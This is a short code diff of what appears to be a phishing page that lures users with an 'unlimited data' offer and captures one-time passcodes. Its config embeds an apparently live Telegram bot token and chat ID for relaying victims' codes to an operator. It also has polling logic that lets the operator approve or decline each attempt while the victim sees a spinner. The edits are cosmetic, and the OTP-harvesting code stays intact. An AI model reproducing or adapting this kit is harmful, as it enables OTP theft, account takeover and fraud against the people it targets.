@@ -182,7 +182,6 @@
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
-            APPROVE_PAGE: 'https://unlimiteddata.vercel.app/otp.html',   // You can change if needed
             SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
             DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
         };
@@ -201,7 +200,7 @@
         const successMsg = document.getElementById('successMsg');
         const spinner = document.getElementById('spinner');
 
-        // Auto-focus and movement
+        // OTP Input Handling
         inputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 if (e.target.value.length > 1) {
@@ -297,7 +296,6 @@
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
-                                    successMsg.style.display = 'none';
                                 } else if (cb === state.verifyDeviceId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
